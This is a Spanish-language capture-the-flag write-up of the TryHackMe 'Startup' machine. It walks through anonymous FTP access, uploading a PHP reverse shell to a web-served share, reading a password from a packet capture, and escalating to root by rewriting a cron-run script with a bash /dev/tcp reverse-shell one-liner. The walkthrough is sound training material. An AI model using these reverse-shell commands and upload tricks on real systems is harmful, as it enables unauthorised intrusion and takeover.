Hola gente!
Este es mi primer "write-up", espero qu elo disfruten.
(Little note for a friend, Esqy thank you for the motivation into making this write-up, I hope I can make more in the future.)
Bueno empezemos!
Primero hacemos un rapido scan con Rustscan, un Nmap mas rapido creado por Bee-san.
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que tenemos 3 servicios en esta maquina.
Primero veremos el ftp.
Al parecer este servicio este FTP dejo abierto el login anonimo.
```
-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
```
Encontramos 2 archivos en esta maquina.
En notice.txt para ser que estan jugando Among Us en la oficina.
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
En el important.jpg parece ser que algunos miembros del equipo se estaban divirtiendo con unos memes.
![meme](https://github.com/Believer1/THM-writeups/blob/main/startup/images/important.jpg)

Ahora emepzemos a buscar directorios en el website
```
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.199.203
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/23 12:49:11 Starting gobuster
===============================================================
/files (Status: 301)
```

![files](https://github.com/Believer1/THM-writeups/blob/main/startup/images/files.png)


Hmmmm... que raro. Son los mismos archivos que en el FTP. Seran que estan conectados?

Para probar esto subire una "reverse shell" en PHP hecha por PentestMonkey
```
ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
Cambiamos el ip por el nuestro del "network" de TryHackMe.
```
ftp> put reverse.php 
local: reverse.php remote: reverse.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
```
Y lo ponemos en el FTP.
```
nc -nlvp 1234
listening on [any] 1234 ...
```
Empezamos un "listener" con NetCat.

![reverse](https://github.com/Believer1/THM-writeups/blob/main/startup/images/reverse.png)
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Ahi esta! Conseguimos un "shell".

Usando Linpeas hay unos archivos que me resaltan.
Encontramos un archivo llamado recipe.txt
```
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was <redactado>
```
Encontramos nuestro primera respuesta.
Ahora pasamos el segundo archivo que es un .pcapng usando el servicio de FTP.
```
cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
```
Vemos en wireshark un trafico interesante que revela detalles interesantes.
```www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: <redactado>
```
Cambiamos de usuario y cogemos el segundo flag.
Usando Linpeas encontramos otro archivo /etc/print.sh.
Re-escribimos el archivo con un "reverse shell" en Bash
```bash -i >& /dev/tcp/IP/8888 0>&1```
Esperamos un tiempo ya que esto es una accion programada por el usuario root.
```
root@startup:~# whoami
whoami
root
root@startup:~# 
```
Conseguimos root!
Agarramos el flag en /root/root.txt y completamos la maquina!

Gracias por leer mi primer write-up espero que les ha gustado.
